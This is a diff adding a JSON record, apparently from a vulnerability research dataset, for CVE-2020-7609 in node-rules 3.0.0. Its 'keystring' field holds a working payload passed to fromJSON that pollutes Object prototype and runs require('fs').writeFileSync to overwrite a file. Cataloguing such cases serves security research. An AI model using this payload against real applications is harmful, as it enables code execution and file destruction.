@@ -1,0 +1,8 @@
+{
+    "id": "CVE-2020-7609",
+    "upstream": "node-rules@3.0.0",
+    "keymethod": "fromJSON",
+    "keystring": "{\"condition: \"{}.__proto__.toString = 222 \", consequence: \"require(`fs`).writeFileSync(`node-rules`,``)\"}",
+    "location": "lib/node-rules.js:245:33",
+    "downstreams": []
+}
